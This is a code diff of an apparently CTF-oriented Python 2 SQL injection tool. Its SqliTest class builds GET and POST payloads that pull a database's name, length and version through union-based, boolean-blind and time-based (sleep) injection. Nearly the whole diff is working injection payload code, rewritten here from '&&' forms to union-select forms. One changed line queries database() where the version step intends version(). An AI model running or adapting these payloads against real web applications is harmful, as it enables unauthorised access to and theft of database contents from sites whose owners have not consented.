@@ -4,6 +4,7 @@ from lib.log import logger
 from config import BaseConfig
 from config import UnpackFunction
 from data import DataProcess
+from tqdm import trange
 
 __author__ = "LoRexxar"
 
@@ -11,17 +12,18 @@ __author__ = "LoRexxar"
 class SqliTest(BaseConfig):
     def __init__(self):
         BaseConfig.__init__(self)
+        self.Data = DataProcess()
 
     def test(self, output=1):
         # global conf
         if self.sqlirequest == "GET":
-            payload = "username = ddog||1%23&passwd=ddog123&submit=Log+In"
+            payload = "user=user1"
             r = self.Data.GetData(payload)
 
         elif self.sqlirequest == "POST":
-            payload = {"username": "a||1'#", "password": "a"}
+            payload = {"user": "user1"}
             r = self.Data.PostData(payload)
-        if self.len != 0:
+        if self.len == 0:
             logger.info("Set the parameters of the self.len...")
             self.len = len(r)
         if output == 1:
@@ -37,7 +39,7 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
-                payload = "username=ddog123' && select length(database()) && '1'='1&passwd=ddog123&submit=Log+In"
+                payload = "user=ddog123' union select 1,length(database())%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
                 database_len = int(UnpackFunction(r))
                 logger.info("Database length sqli success...The database_len is %d..." % database_len)
@@ -45,7 +47,7 @@ class SqliTest(BaseConfig):
 
                 # 然后注database
                 # payload = {"username": "ddog' or select database()%23", "password": "a"}
-                payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
+                payload = "user=ddog123' union select 1,database()%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
                 database = UnpackFunction(r)
                 logger.info("Database sqli success...The database is %s" % database)
@@ -53,12 +55,18 @@ class SqliTest(BaseConfig):
                 self.database = database
 
             elif self.sqlimethod == "build":
+
+                # 如果self.len是未被定义过的，需要test跑一下
+                if self.len == 0:
+                    self.test(output=0)
+
                 # 先注database长度
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 logger.info("Start database length sqli...")
                 # logger.info("Start database length sqli payload Queue build...")
-                for i in range(1, 30):
-                    payload = "username=ddog123' && (select length(database())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
+                for i in trange(30, desc="Database length sqli...", leave=False):
+                    payload = "user=user1' %26%26 (select length(database())) > " + repr(i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
+                    # print self.len
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         database_len = i
                         break
@@ -70,22 +78,22 @@ class SqliTest(BaseConfig):
                 # 再注database
                 logger.info("Start database sqli...")
                 for i in range(1, database_len):
-                    for j in range(30, 130):
-                        payload = "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
+                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                        payload = "user=user1'%26%26ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.GetBuildData(payload, self.len) == 0:
-                            database += chr(int(j))
+                            database += chr(int(j+30))
                             break
                 logger.info("Database sqli success...The database is %s" % database)
-                print "[*] database: %s" + database
+                print "[*] database: %s" % database
                 self.database = database
 
             elif self.sqlimethod == "time":
                 # 先注database长度
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 logger.info("Start database length sqli...")
-                for i in range(1, 30):
-                    payload = "username=ddog123' && SELECT if((select length(database()))>" + repr(
-                        i) + ",sleep("+self.time+"),0) && '1'='1&passwd=ddog123&submit=Log+In"
+                for i in trange(30, desc="Database length sqli...", leave=False):
+                    payload = "user=ddog123' union SELECT 1,if((select length(database()))>" + repr(
+                        i) + ",sleep(" + repr(self.time) + "),0) %23"
                     if self.Data.GetTimeData(payload, self.time) == 0:
                         database_len = i
                         break
@@ -97,14 +105,14 @@ class SqliTest(BaseConfig):
                 # 再注database
                 logger.info("Start database sqli...")
                 for i in range(1, database_len):
-                    for j in range(30, 130):
-                        payload = "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
-                            j) + ",sleep("+self.time+"),0) && '1'='1&passwd=ddog123&submit=Log+In"
+                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                        payload = "user=ddog123'union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
+                            j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
                         if self.Data.GetTimeData(payload, self.time) == 0:
-                            database += chr(int(j))
+                            database += chr(int(j + 30))
                             break
                 logger.info("Database sqli success...The database is %s" % database)
-                print "[*] database: %s" + database
+                print "[*] database: %s" % database
                 self.database = database
 
         # 然后是post
@@ -113,16 +121,18 @@ class SqliTest(BaseConfig):
             if self.sqlimethod == "normal":
                 # 先注database长度
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
-                payload = {"username": "ddog' or select length(database())%23", "password": "a"}
+                payload = {"user": "ddog' union select 1,length(database())#", "password": "a"}
                 # payload = "username=ddog123' && select length(database()) && '1'='1&passwd=ddog123&submit=Log+In"
                 r = self.Data.PostData(payload)
                 database_len = int(UnpackFunction(r))
                 print "[*] database_len: %d" % database_len
+
                 # 然后注database
-                payload = {"username": "ddog' or select database()%23", "password": "a"}
+                payload = {"user": "ddog' union select 1,database()#", "password": "a"}
                 # payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
                 r = self.Data.PostData(payload)
                 database = UnpackFunction(r)
+                logger.info("Database sqli success...The database is %s" % database)
                 print "[*] database: " + database
                 self.database = database
 
@@ -131,8 +141,8 @@ class SqliTest(BaseConfig):
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 logger.info("Start database length sqli...")
                 # logger.info("Start database length sqli payload Queue build...")
-                for i in range(1, 30):
-                    payload = {"username":"ddog123' && (select length(database())) > " + repr(i) + " && '1'='1", "passwd": "ddog123"}
+                for i in trange(30, desc="Database length sqli...", leave=False):
+                    payload = {"user": "user1' && (select length(database())) > " + repr(i) + " && '1'='1", "passwd": "ddog123"}
                     # payload = "username=ddog123' && (select length(database())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         database_len = i
@@ -144,24 +154,24 @@ class SqliTest(BaseConfig):
 
                 # 再注database
                 logger.info("Start database sqli...")
-                for i in range(1, database_len):
-                    for j in range(30, 130):
-                        payload = {"username": "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1", "passwd": "ddog123"}
+                for i in range(1, database_len + 1):
+                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                        payload = {"user": "user1' && ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1", "passwd": "ddog123"}
                         # payload = "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.PostBuildData(payload, self.len) == 0:
-                            database += chr(int(j))
+                            database += chr(int(j + 30))
                             break
                 logger.info("Database sqli success...The database is %s" % database)
-                print "[*] database: %s" + database
+                print "[*] database: %s" % database
                 self.database = database
 
             elif self.sqlimethod == "time":
                 # 先注database长度
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 logger.info("Start database length sqli...")
-                for i in range(1, 30):
-                    payload = {"username": "username=ddog123' && SELECT if((select length(database()))>" + repr(
-                        i) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
+                for i in trange(30, desc="Database length sqli...", leave=False):
+                    payload = {"user": "ddog123' union SELECT 1,if((select length(database()))>" + repr(
+                        i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                     # payload = "username=ddog123' && SELECT if((select length(database()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                     if self.Data.PostTimeData(payload, self.time) == 0:
                         database_len = i
@@ -173,16 +183,16 @@ class SqliTest(BaseConfig):
 
                 # 再注database
                 logger.info("Start database sqli...")
-                for i in range(1, database_len):
-                    for j in range(30, 130):
-                        payload = {"username": "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
-                            j) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
+                for i in range(1, database_len + 1):
+                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                        payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
+                            j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                         # payload = "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.PostTimeData(payload, self.time) == 0:
-                            database += chr(int(j))
+                            database += chr(int(j + 30))
                             break
                 logger.info("Database sqli success...The database is %s" % database)
-                print "[*] database: %s" + database
+                print "[*] database: %s" % database
                 self.database = database
 
     # version
@@ -196,13 +206,13 @@ class SqliTest(BaseConfig):
                 # 先注version长度
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
-                payload = "username=ddog123' && select length(version()) && '1'='1&passwd=ddog123&submit=Log+In"
+                payload = "user=ddog123' union select 1,length(version())%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
                 version_len = int(UnpackFunction(r))
                 print "[*] version_len: %d" % version_len
                 # 然后注version
                 # payload = {"username": "ddog' or select version()%23", "password": "a"}
-                payload = "username=ddog123' && select version() && '1'='1&passwd=ddog123&submit=Log+In"
+                payload = "user=ddog123' union select 1,database()%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
                 version = UnpackFunction(r)
                 print "[*] version: " + version
@@ -212,7 +222,7 @@ class SqliTest(BaseConfig):
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 logger.info("Start version length sqli...")
                 # logger.info("Start version length sqli payload Queue build...")
-                for i in range(1, 30):
+                for i in trange(30, desc="Version length sqli...", leave=False):
                     payload = "username=ddog123' && (select length(version())) > " + repr(
                         i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                     if self.Data.GetBuildData(payload, self.len) == 0:
